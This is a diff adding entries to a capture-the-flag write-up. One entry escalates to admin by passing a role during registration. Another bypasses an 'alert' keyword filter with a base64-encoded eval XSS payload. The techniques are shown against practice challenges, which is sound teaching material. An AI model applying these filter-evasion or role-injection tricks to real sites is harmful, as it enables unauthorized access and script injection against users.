@@ -46,5 +46,37 @@ Solution:
 
 Thanks pal.
 
+## 3
+Just call the function from console.
+
 ## 4
 Register. Password of moderator is in the user profile image. Get sources as moderator. Sources show that registratin take role too. Register as admin. As admin go to admin page and see flag.
+
+
+## 5
+
+The page has an input and renders the input after running a function on your code.
+```
+function sanitize(input) {
+    // no alert!
+    if (input.toLowerCase().includes('alert')) {
+        return 'NO!';
+    }
+    return input;
+}
+```
+
+Solution:
+```
+<iframe src="" 
+        scrolling="no" sandbox="allow-scripts allow-popups allow-modals allow-same-origin" 
+        name="sandbox" style="width: 100%; height: 100%; border: 0px;"></iframe>
+
+<script>
+console.log("hi");
+eval(atob('YWxlcnQoMSk7'));
+</script>
+```
+
+Where `YWxlcnQoMSk7` is `alert(1);`.
+
